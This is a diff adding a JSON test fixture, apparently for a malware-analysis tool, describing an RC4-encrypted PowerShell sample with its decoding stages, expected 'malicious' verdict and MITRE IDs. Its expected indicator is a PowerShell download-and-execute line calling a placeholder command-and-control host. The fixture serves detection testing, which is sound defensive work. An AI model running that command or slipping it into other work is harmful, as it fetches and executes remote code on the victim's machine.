@@ -1,0 +1,24 @@
+{
+  "id": "rc4-inline-ps-2",
+  "algorithm": "RC4",
+  "key_status": "inline-static",
+  "recoverable_stages": [
+    "base64-decode",
+    "rc4-decrypt-inline-key",
+    "utf8-decode"
+  ],
+  "runtime_stages": [],
+  "expected_verdict": "malicious",
+  "expected_iocs": [
+    "IEX (New-Object Net.WebClient).DownloadString('http://c2/x.ps1')"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "static_recovery_verdict": "static-recovery-complete"
+}
